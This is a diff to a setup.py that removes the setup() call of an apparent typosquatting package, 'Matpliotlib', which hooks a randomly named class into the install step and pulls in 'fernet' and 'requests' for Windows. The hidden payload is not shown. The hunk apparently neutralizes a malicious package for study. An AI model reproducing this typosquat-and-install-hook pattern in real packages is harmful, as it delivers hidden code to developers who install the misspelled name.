@@ -18,22 +18,5 @@ class jZIbcVNRxfnTNLWUPyiHYfkxLifUNUdetXWgwjpEhzZiuxGNaMTNivIJlvkOUtmJFHSEfBZysd
             install.run(self)
 
 
-setup(
-    name="Matpliotlib",
-    version=VERSION,
-    author="PtXkGPVMCfKS",
-    author_email="arcKWmQFkUozSwPf@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': jZIbcVNRxfnTNLWUPyiHYfkxLifUNUdetXWgwjpEhzZiuxGNaMTNivIJlvkOUtmJFHSEfBZysdQHbKguvJLBnoOWXBndWUtLYKoCVNkVbPJTJBpvoJBuIuePeTyAWJHfpMLnWvutpgMUgpbFyGeOkBskaNpcqveeSZjSQzLhuhpgRyjneE,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
 
